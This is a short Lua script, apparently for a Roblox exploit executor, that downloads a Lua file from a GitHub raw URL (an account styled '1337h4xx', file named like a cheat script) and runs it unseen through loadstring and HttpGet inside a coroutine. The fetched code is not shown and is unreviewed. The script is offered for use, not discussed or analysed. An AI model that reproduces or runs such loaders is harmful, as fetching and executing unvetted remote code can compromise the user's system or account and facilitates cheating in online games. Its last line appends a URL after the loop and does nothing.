# Script
```
local scripts = {
    'https://raw.githubusercontent.com/1337h4xx/1/main/Longneck_V_B_H.lua',
}
for _, url in ipairs(scripts) do
    local thread = coroutine.create(function()
        loadstring(game:HttpGet(url, true))()
    end)
    coroutine.resume(thread)
end
table.insert(scripts, "new_script_url")
```
